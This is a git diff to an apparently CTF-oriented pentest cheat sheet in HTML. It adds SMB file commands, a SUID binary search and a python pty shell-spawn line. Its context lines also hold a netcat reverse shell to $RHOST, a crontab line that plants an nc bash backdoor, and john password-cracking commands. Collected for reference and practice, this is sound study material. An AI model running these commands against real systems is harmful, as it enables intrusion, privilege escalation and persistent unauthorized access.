@@ -30,6 +30,13 @@ and your IP changes just before the game starts, and no script have the correct 
 
 <b>pform@attacker~: </b><code>smbclient -L \\\\10.10.10.10\\C$ -U guest -W WORKGROUP</code>
 
+<b>Download :</b> get
+
+<b>Upload :</b> put
+
+<b>Read files :</b> more 
+
+
 
 <h2>FTP</h2>
 
@@ -152,6 +159,8 @@ Linpeas <li>https://github.com/carlospolop/privilege-escalation-awesome-scripts-
 
 LinEnum <li>https://github.com/rebootuser/LinEnum</li>
 
+<b>pform@attacker~: </b><code>find / -perm -u=s -type f 2>/dev/null</code>
+
 
 
 GTFObins <li>https://gtfobins.github.io/</li>
@@ -208,9 +217,12 @@ sudo nc -e /bin/sh $RHOST $RPORT
 add to crontab to get root after 1 min <code>echo ' *  *  *  *  * /usr/bin/nc -c /bin/bash' >> /etc/crontab</code>
 
 
-<h1>Shell Tips!</h1>
+<h1>SPAWN BASH SHELL</h1>
 
 <b>From rbash to bash</b> <code>ssh user@10.10.10.10 -p 22 -t "bash -l"</code>
+
+<b>From sh to bash</b<code>python -c 'import pty;pty.spawn("/bin/bash")'</code>
+
 
 <h1>Stabalize your shell<h1>
 
@@ -228,5 +240,4 @@ add to crontab to get root after 1 min <code>echo ' *  *  *  *  * /usr/bin/nc -c
 <code>john --format=PKZIP ziphash.txt</code>
 
 <code>john --wordlist /opt/wordlists/rockyou.txt hash.txt</code>
-
 
